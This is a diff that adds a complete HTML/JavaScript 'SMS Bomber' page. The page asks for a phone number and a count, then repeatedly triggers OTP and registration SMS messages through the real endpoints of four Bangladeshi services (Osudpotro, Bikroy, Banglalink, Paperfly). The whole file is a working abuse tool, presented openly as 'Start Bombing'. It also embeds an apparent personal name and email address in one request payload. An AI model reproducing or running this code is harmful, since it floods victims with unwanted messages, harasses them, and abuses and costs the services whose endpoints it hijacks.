@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SMS Bomber by Abubokar</title>
+  <style>
+    body {
+      background: #1a1a1a;
+      color: #0f0;
+      font-family: 'Arial', sans-serif;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
+      flex-direction: column;
+    }
+    h2 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+    }
+    input, button {
+      padding: 15px;
+      font-size: 18px;
+      margin: 10px 0;
+      width: 300px;
+      border-radius: 8px;
+      border: 2px solid #0f0;
+      background: #333;
+      color: #0f0;
+      transition: background 0.3s, transform 0.3s;
+    }
+    input:focus, button:focus {
+      outline: none;
+      background: #444;
+      transform: scale(1.05);
+    }
+    button {
+      cursor: pointer;
+      font-weight: bold;
+    }
+    #statusArea {
+      margin-top: 30px;
+      white-space: pre-line;
+      max-width: 400px;
+      overflow-wrap: break-word;
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.5);
+      font-size: 1rem;
+      line-height: 1.5;
+      max-height: 300px;
+      overflow-y: auto;
+      color: #fff;
+    }
+    @media (max-width: 600px) {
+      input, button {
+        width: 90%;
+      }
+      #statusArea {
+        width: 90%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h2>SMS Bomber by Abubokar</h2>
+  <input type="text" id="phoneNumber" placeholder="Enter Phone Number (e.g. 01xxxxxxxxx)" />
+  <input type="number" id="limit" placeholder="Limit (e.g. 10)" />
+  <button onclick="startBombing()">Start Bombing</button>
+
+  <div id="statusArea"></div>
+
+  <script>
+    async function sendOsudpotroOTP(phone) {
+      const payload = {
+        mobile: "+88-" + phone,
+        deviceToken: "web",
+        language: "en",
+        os: "web"
+      };
+      try {
+        const response = await fetch('https://api.osudpotro.com/api/v1/users/send_otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        return { success: response.ok, message: result.message || "Unknown (Osudpotro)" };
+      } catch {
+        return { success: false, message: "Network error (Osudpotro)" };
+      }
+    }
+
+    async function sendBikroyOTP(phone) {
+      try {
+        const response = await fetch(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`);
+        return { success: response.ok, message: response.ok ? "Bikroy OTP sent" : "Bikroy rejected" };
+      } catch {
+        return { success: false, message: "Network error (Bikroy)" };
+      }
+    }
+
+    async function sendBanglalinkOTP(phone) {
+      const payload = { type: "phone", phone: phone };
+      try {
+        const response = await fetch('https://eshop-api.banglalink.net/api/v1/customer/send-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        return { success: response.ok, message: result.message || "Banglalink response" };
+      } catch {
+        return { success: false, message: "Network error (Banglalink)" };
+      }
+    }
+
+    async function sendPaperflyOTP(phone) {
+      const payload = {
+        full_name: "Abu Bokar Siddik",
+        company_name: "Abdusk.ltd",
+        email_address: "ukyt54847@gmail.com",
+        phone_number: phone
+      };
+      try {
+        const response = await fetch("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        const result = await response.json();
+        return {
+          success: response.ok,
+          message: result.message || "Paperfly responded"
+        };
+      } catch {
+        return { success: false, message: "Network error (Paperfly)" };
+      }
+    }
+
+    async function startBombing() {
+      const phone = document.getElementById('phoneNumber').value.trim();
+      const limit = parseInt(document.getElementById('limit').value);
+      const statusArea = document.getElementById('statusArea');
+
+      if (!phone.startsWith('01')) {
+        statusArea.textContent = '❌ Invalid phone number!';
+        return;
+      }
+      if (isNaN(limit) || limit < 1) {
+        statusArea.textContent = '❌ Invalid limit!';
+        return;
+      }
+
+      statusArea.textContent = '🚀 Starting bombing...\n';
+
+      for (let i = 1; i <= limit; i++) {
+        const res1 = await sendOsudpotroOTP(phone);
+        const res2 = await sendBikroyOTP(phone);
+        const res3 = await sendBanglalinkOTP(phone);
+        const res4 = await sendPaperflyOTP(phone);
+
+        statusArea.textContent += `#${i} Osudpotro: ${res1.success ? "✅" : "❌"} - ${res1.message}\n`;
+        statusArea.textContent += `#${i} Bikroy: ${res2.success ? "✅" : "❌"} - ${res2.message}\n`;
+        statusArea.textContent += `#${i} Banglalink: ${res3.success ? "✅" : "❌"} - ${res3.message}\n`;
+        statusArea.textContent += `#${i} Paperfly: ${res4.success ? "✅" : "❌"} - ${res4.message}\n\n`;
+
+        await new Promise(resolve => setTimeout(resolve, 2500)); // 2.5 sec delay
+      }
+
+      statusArea.textContent += '⏹️ Bombing finished!';
+    }
+  </script>
+</body>
+</html>
